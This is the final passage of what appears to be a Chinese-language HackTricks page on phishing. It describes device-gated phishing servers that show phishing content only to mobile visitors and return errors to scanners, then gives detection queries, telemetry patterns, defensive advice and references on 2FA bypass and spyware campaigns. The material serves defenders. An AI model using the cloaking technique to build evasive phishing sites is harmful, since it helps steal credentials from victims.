- 接受 `POST /detect {"is_mobile":true|false}`。
- 后续 GET 请求中若 `is_mobile=false`，则返回 500（或占位内容）；只有 `is_mobile=true` 时才提供 phishing 内容。

搜寻与检测启发式：
- urlscan 查询：`filename:"detect_device.js" AND page.status:500`
- Web 遥测：依次出现 `GET /static/detect_device.js` → `POST /detect` → 非 mobile 请求返回 HTTP 500；合法的 mobile 受害者请求路径则返回 200，并附带后续 HTML/JS。
- 阻止或审查仅根据 `ontouchstart` 或类似设备检查来决定内容的页面。

防御建议：
- 使用类似 mobile 的指纹并启用 JS 来运行爬虫，以发现受限内容。
- 对新注册域名上 `POST /detect` 之后出现的可疑 500 响应发出警报。

## References

- [1] [生成用于 phishing 的域名变体 (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [发现 phishing：工具与技术 (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [窃取凭据并使用 noVNC 绕过 2FA (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [使用 EvilnoVNC 窃取会话并绕过 2FA (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [如何在 Debian Wheezy 上安装和配置 Postfix 的 DKIM (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 全球事件响应报告——社会工程学篇](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing——移动设备门控的 phishing 基础设施与启发式方法 (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [运行时组装攻击的下一个前沿：利用 LLM 实时生成 phishing JavaScript](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [冒充、点击劫持与 TDS：深入剖析恶意软件分发生态系统](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [对 Windows.com 进行 Bitsquatting (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [通过位翻转劫持指向 Microsoft windows.com 的流量 (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [爱情？其实是骗局：假约会应用被用作诱饵，参与针对巴基斯坦的间谍软件行动](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC 与样本](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [揭露 AdFection：Discover-Tech 如何将定向广告变成零点击雇佣间谍软件的投放渠道](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
